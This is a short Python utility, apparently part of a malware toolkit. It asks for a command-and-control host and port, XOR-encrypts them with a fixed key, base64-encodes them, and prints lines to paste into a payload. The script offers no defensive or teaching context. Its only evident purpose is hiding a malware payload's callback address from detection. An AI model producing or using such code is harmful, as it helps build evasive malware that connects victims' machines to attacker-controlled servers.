import base64

def xor_encrypt(data: str, key: bytes) -> bytes:
    data_bytes = data.encode()
    return bytes(
        a ^ b
        for a, b in zip(
            data_bytes,
            (key * ((len(data_bytes) // len(key)) + 1))[: len(data_bytes)]
        )
    )


def main():
    HOST = input("Enter C2 HOST (e.g., 192.168.1.10): ").strip()
    PORT = input("Enter C2 PORT (e.g., 4444): ").strip()

    KEY = b"X" * 32  # must match your payload's KEY

    enc_host = xor_encrypt(HOST, KEY)
    enc_port = xor_encrypt(PORT, KEY)

    b64_host = base64.b64encode(enc_host).decode()
    b64_port = base64.b64encode(enc_port).decode()

    print("\nPaste into your payload:")
    print(f"KEY = {KEY!r}")
    print(f'ENCRYPTED_HOST = base64.b64decode("{b64_host}")')
    print(f'ENCRYPTED_PORT = base64.b64decode("{b64_port}")')


if __name__ == "__main__":
    main()
